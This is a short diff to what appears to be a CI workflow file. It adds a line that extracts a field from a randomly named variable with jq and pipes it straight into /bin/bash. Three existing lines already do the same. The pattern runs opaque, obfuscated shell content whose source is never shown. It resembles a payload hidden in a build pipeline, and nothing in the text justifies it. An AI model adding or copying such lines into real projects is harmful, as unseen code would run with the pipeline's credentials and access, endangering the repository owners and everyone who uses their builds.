@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$qdaw311" | jq -r .cema42863 | /bin/bash
           echo $r7819 | jq -r .w3 | /bin/bash
           echo $rmxid3 | jq -r .qtkv13838 | /bin/bash
+          printf '%s' "$hpmbi50" | jq -r .buti5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
